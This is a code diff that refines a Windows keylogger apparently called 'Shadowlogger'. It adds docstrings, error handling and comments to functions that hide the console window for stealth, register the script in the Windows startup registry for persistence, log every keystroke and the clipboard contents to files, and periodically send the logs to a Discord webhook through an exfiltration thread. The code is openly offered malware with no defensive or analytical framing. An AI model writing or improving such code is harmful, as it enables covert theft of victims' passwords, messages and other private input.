@@ -18,9 +18,14 @@ CLIPBOARD_FILE = "clipdata.log"
 WEBHOOK_URL = None
 
 def hide_console():
-    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+    """Hide console window for stealth mode."""
+    try:
+        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+    except Exception:
+        pass
 
 def add_to_startup(app_name="Shadowlogger"):
+    """Add this script to Windows registry for persistence."""
     try:
         file_path = os.path.abspath(__file__)
         reg_key = winreg.OpenKey(
@@ -34,6 +39,7 @@ def add_to_startup(app_name="Shadowlogger"):
         pass
 
 def log_clipboard():
+    """Capture clipboard contents when Ctrl+V is pressed."""
     try:
         win32clipboard.OpenClipboard()
         data = win32clipboard.GetClipboardData()
@@ -44,18 +50,24 @@ def log_clipboard():
         pass
 
 def log_keystroke(key):
-    with open(KEYLOG_FILE, 'a', encoding='utf-8') as f:
-        try:
-            f.write(key.char)
-        except AttributeError:
-            if key == key.space:
+    """Log each keystroke to a file."""
+    try:
+        with open(KEYLOG_FILE, 'a', encoding='utf-8') as f:
+            if hasattr(key, 'char') and key.char:
+                f.write(key.char)
+            elif key == key.space:
                 f.write(' ')
             else:
                 f.write(f'[{str(key)}]')
+    except Exception:
+        pass
+
+    # Trigger clipboard logging on Ctrl + V
     if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
         log_clipboard()
 
 def send_logs():
+    """Send logs to Discord webhook, if configured."""
     if WEBHOOK_URL:
         try:
             with open(KEYLOG_FILE, 'r', encoding='utf-8') as f:
@@ -71,6 +83,7 @@ def send_logs():
             pass
 
 def exfil_loop(interval=300):
+    """Run periodic log sending every X seconds."""
     while True:
         send_logs()
         time.sleep(interval)
@@ -91,11 +104,14 @@ def main():
     if args.persist:
         add_to_startup()
 
-    threading.Thread(target=exfil_loop, daemon=True).start()
+    # Start exfiltration thread (if webhook provided)
+    if WEBHOOK_URL:
+        threading.Thread(target=exfil_loop, daemon=True).start()
 
+    # Start keylogger listener
     with keyboard.Listener(on_press=log_keystroke) as listener:
         listener.join()
 
+# Entry point
 if __name__ == "__main__":
     main()
-    
